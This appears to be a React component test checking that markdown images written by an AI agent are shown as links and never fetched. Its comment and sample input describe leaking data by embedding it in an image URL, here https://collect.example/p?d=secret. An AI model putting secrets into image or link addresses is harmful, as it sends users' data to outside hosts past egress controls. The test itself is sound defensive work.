import { render, screen } from '@testing-library/react'
import { describe, expect, it } from 'vitest'

import { ThoughtMarkdownText } from './MarkdownText'

describe('an image in markdown an agent wrote', () => {
  /// Rendered, an <img> is fetched with no click -- carrying whatever the
  /// agent put in its address to a host no egress rule saw.
  it('is shown as its address and never fetched', () => {
    const { container } = render(
      <ThoughtMarkdownText text="Done. ![chart](https://collect.example/p?d=secret)" />,
    )
    expect(container.querySelector('img')).toBeNull()
    const link = screen.getByRole('link')
    expect(link.getAttribute('href')).toBe('https://collect.example/p?d=secret')
    expect(link.textContent).toContain('[image: chart]')
  })
})
